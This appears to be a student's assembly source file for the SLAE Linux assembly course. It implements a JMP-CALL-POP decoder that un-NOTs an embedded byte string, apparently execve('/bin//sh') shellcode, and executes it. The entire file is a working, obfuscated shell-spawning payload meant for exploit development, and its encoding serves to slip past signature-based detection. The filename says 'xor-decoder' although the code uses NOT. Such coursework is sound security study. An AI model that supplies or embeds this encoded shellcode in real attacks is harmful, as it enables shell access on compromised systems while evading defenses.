; Filename: shell_xor-decoder.nasm
; Author:  Marco Lugo (SLAE-1031)
; Description: spawns a shell
;
; For the SecurityTube Linux Assembly Expert (SLAE) course
; Using the JMP-CALL-POP method, NOT decodes the shellcode in memory
; The resulting shellcode is 44 bytes

global _start

section .text

_start:
        jmp step1 ; unconditional jump to step1

step2:
        pop edx ; retrieves the address of Shellcode
        xor ecx, ecx ; assigns 0x00 to ECX
        mov cl, 0x19 ; assigns 25 to ECX

decode:
        not byte [edx] ; decode the shellcode byte by byte by applying bit-wise not
        inc edx ; move to the next byte in line to NOT
        loop decode ; continue with the loop (jumps back to decode)

        jmp Shellcode ; with the shellcode now fully decoded, jump to it for execution

step1:
        call step2 ; jumps to step2 while pushing the address of Shellcode to the stack
        Shellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f